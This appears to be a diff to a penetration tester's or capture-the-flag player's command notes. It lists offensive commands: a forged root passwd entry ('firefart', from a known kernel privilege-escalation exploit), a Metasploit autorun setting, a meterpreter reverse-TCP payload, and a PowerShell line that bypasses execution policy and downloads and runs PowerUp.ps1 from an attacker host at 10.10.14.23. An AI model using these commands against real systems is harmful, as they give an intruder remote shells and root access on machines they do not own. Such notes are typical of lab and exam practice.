@@ -1,6 +1,7 @@
 ./windows-exploit-suggester.py --database 2019-03-17-mssb.xls --systeminfo /root/sandbox/sys_info_xp.txt
 firefart:fib/tLwcEGsC2:0:0:pwned:/root:/bin/bash
 
+set AUTORUNSCRIPT multi_console_command -r /root/autoruncommands.rc
 windows/meterpreter/reverse_tcp_allports
 
 powershell -version 2 -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23:8000/PowerUp.ps1'); Invoke-AllChecks"
